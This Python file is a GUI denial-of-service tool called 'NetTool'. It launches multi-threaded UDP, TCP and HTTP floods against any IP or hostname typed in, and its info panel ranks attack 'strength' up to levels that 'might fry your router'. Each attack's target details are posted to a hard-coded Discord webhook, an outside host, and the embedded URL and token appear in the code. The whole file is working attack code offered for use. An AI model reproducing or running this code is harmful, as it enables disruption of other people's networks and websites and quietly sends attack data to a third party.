import socket
import threading
import random
import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox
import time

# Discord webhook URL (replace with your actual webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1346538480460759123/UAS3fcz1_fjzfx3xx8uYrPCKgi4gLjJ347Mcg2AzD1EJEPHtZrGB1SacYg0O4ytLuZP4"

print("github.com/laladaban33")

# Global list to hold thread references for stopping
threads = []
# Global counters for statistics
udp_packets_sent = 0
tcp_packets_sent = 0
http_requests_sent = 0

# Function to send attack details to Discord webhook
def send_to_discord(ip, port, method, strength, payload_size):
    data = {
        "content": f"Attack started!\nIP/Hostname: {ip}\nPort: {port}\nMethod: {method}\nStrength: {strength}\nPayload Size: {payload_size} bytes"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Attack details sent to Discord successfully.")
        else:
            print("Failed to send attack details to Discord.")
    except requests.RequestException as e:
        print(f"Error sending to Discord: {e}")

# Function to check if the IP is from a VPN
def is_vpn(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        if 'org' in data and ('VPN' in data['org'] or 'Proxy' in data['org']):
            return True
        return False
    except requests.RequestException:
        return False

# Function to resolve domain name to IP address
def resolve_hostname(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ip
    except socket.gaierror:
        return None

# Function to start UDP attack with custom payload size
def udp_flood(target_ip, target_port, strength, console, payload_size):
    global udp_packets_sent  # Use global variable
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(payload_size)  # Use the custom payload size
    
    def attack():
        global udp_packets_sent  # Use global variable
        while True:
            sock.sendto(payload, (target_ip, target_port))
            udp_packets_sent += 1  # Increment counter for each packet sent
            console.insert(tk.END, f"[UDP] Sent packet to {target_ip}:{target_port}\n")
            console.see(tk.END)
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)  # Add thread to global list
        thread.start()

# Function to start TCP attack with custom payload size
def tcp_flood(target_ip, target_port, strength, console, payload_size):
    global tcp_packets_sent  # Use global variable
    def attack():
        global tcp_packets_sent  # Use global variable
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(random._urandom(payload_size))  # Use the custom payload size
                tcp_packets_sent += 1  # Increment counter for each packet sent
                console.insert(tk.END, f"[TCP] Sent packet to {target_ip}:{target_port}\n")
                console.see(tk.END)
                sock.close()
            except:
                pass
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)  # Add thread to global list
        thread.start()

# Function to start HTTP attack
def http_flood(target_ip, strength, console):
    global http_requests_sent  # Use global variable
    def attack():
        global http_requests_sent  # Use global variable
        while True:
            try:
                response = requests.get(target_ip)
                http_requests_sent += 1  # Increment counter for each HTTP request
                console.insert(tk.END, f"[HTTP] Sent request to {target_ip}, Response: {response.status_code}\n")
                console.see(tk.END)
            except:
                pass
    
    for _ in range(strength):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)  # Add thread to global list
        thread.start()

# Function to show information about attack strength
def show_info():
    info_text = (
        "Strength Levels:\n"
        "Small: 10-50 - Slightly slows internet connection\n"
        "Medium: 100-500 - Can slow down or even shut off connection\n"
        "High: 1000+ - Might fry your router\n"
        "UDP Flood - Byte/packet size (exponential)\n"
        "HTTP/TCP Flood - Amount of bots sending packets\n"
        "HTTP - For websites\n"
        "Ports - Websites - Usually 80 or 443\n"
        "Ports - Networks - 80, 443, 53, 22"
    )
    console.insert(tk.END, f"\n{info_text}\n")
    console.see(tk.END)

# Function to validate IP
def validate_ip(ip):
    try:
        socket.inet_aton(ip)  # Validate that the IP is a valid IPv4 address
        return True
    except socket.error:
        return False

# Function to validate port
def validate_port(port):
    return 1 <= port <= 65535  # Valid range for ports is from 1 to 65535

# Start the attack based on the user's input
def start_attack():
    target = ip_entry.get()
    target_port = int(port_entry.get())
    method = method_var.get()
    strength = int(strength_entry.get().split('-')[-1])
    payload_size = int(payload_size_entry.get())  # Get the custom payload size from the user

    # Check if the target is an IP or a domain
    if validate_ip(target):
        target_ip = target  # If it's a valid IP, use it directly
    else:
        target_ip = resolve_hostname(target)  # Try resolving the hostname to IP
        if not target_ip:
            messagebox.showerror("Invalid Hostname", f"Could not resolve the hostname: {target}")
            return

    # Validate Port
    if not validate_port(target_port):
        messagebox.showerror("Invalid Port", "The provided port is not valid. Please enter a port between 1 and 65535.")
        return

    # Check if the target IP is a VPN
    if is_vpn(target_ip):
        messagebox.showerror("VPN Detected", "Please turn off your VPN. We don't want VPN companies to be held responsible for YOUR actions.")
        return

    console.insert(tk.END, f"Starting {method} attack on {target_ip}:{target_port} with strength {strength}, payload size {payload_size} bytes\n")

    # Send attack details to Discord webhook
    send_to_discord(target_ip, target_port, method, strength, payload_size)

    # Select attack method based on user input
    if method == "UDP":
        udp_flood(target_ip, target_port, strength, console, payload_size)
    elif method == "TCP":
        tcp_flood(target_ip, target_port, strength, console, payload_size)
    elif method == "HTTP":
        http_flood(target_ip, strength, console)

# Function to stop the attack
def stop_attack():
    # Abort all running threads
    for thread in threads:
        # Set daemon threads will automatically stop when the main program exits
        thread._stop()
    console.insert(tk.END, "Attack stopped\n")
    console.see(tk.END)

# Function to show statistics
def show_statistics():
    stats_text = (
        f"UDP Packets Sent: {udp_packets_sent}\n"
        f"TCP Packets Sent: {tcp_packets_sent}\n"
        f"HTTP Requests Sent: {http_requests_sent}\n"
    )
    console.insert(tk.END, f"\n{stats_text}\n")
    console.see(tk.END)

# GUI Setup
root = tk.Tk()
root.title("NetTool - github.com/laladaban33")
root.geometry("600x650")  # Adjusted window size

# Add a label with "github.com/laladaban33"
github_label = tk.Label(root, text="github.com/laladaban33", font=("Arial", 14, "bold"), pady=10)
github_label.pack()

# Frame for all the input elements to group them together and add padding
frame = tk.Frame(root, padx=10, pady=10)
frame.pack()

tk.Label(frame, text="Target (IP/Hostname):").pack(pady=5)
ip_entry = tk.Entry(frame, width=40)
ip_entry.pack(pady=5)

tk.Label(frame, text="Target Port:").pack(pady=5)
port_entry = tk.Entry(frame, width=40)
port_entry.pack(pady=5)

tk.Label(frame, text="Method:").pack(pady=5)
method_var = tk.StringVar(value="UDP")
tk.OptionMenu(frame, method_var, "UDP", "TCP", "HTTP").pack(pady=5)

tk.Label(frame, text="Strength (Threads/Rate):").pack(pady=5)
strength_entry = tk.Entry(frame, width=40)
strength_entry.pack(pady=5)

# Payload Size entry
tk.Label(frame, text="Payload Size (bytes):").pack(pady=5)
payload_size_entry = tk.Entry(frame, width=40)
payload_size_entry.pack(pady=5)

frame.pack()

# Info Button for Strength Levels
info_button = tk.Button(root, text="i Info", command=show_info, width=10)
info_button.pack(pady=10)

# Start Attack Button with adjusted padding and width
tk.Button(root, text="Start Attack", command=start_attack, width=20).pack(pady=20)

# Stop Attack Button with adjusted padding and width
tk.Button(root, text="Stop Attack", command=stop_attack, width=20).pack(pady=10)

# Statistics Button to show attack statistics
tk.Button(root, text="Show Stats", command=show_statistics, width=20).pack(pady=10)

# Scrolled text for the output
console = scrolledtext.ScrolledText(root, width=70, height=20)
console.pack(pady=10)

root.mainloop()
